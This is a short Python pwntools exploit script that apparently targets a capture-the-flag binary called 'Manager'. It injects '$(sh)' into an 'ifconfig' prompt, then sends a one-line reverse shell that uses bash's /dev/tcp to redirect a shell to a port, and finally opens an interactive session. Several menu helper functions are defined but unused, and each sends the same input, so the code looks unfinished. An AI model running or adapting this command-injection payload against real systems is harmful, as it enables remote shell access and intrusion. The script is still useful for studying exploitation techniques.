from pwn import *

context.binary = "./Manager"
binary = ELF("./Manager")
p = process(["./Manager"])

p.sendlineafter("[Y/N] ", "y")

def shell():
    p.recvuntil("chocie")
    p.sendline("1")

def insert():
    p.recvuntil("chocie")
    p.sendline("1")

def modify():
    p.recvuntil("chocie")
    p.sendline("1")

def show():
    p.recvuntil("chocie")
    p.sendline("1")

######### sub menu #########

def username():
    p.recvuntil("chocie> ")
    p.sendline("1")

def memo():
    p.recvuntil("chocie> ")
    p.sendline("1")

def back():
    p.recvuntil("chocie> ")
    p.sendline("1")

p.sendline("aa")
p.sendline("bb")
p.sendline("bb")
p.sendline("1")
p.sendline("if")
p.recvuntil("ifconfig> ")
log.info("shell")
p.sendline("$(sh)")
p.sendline("/bin/sh > /dev/tcp/127.0.0.1/1337 0<&1 2>&1")

p.interactive()
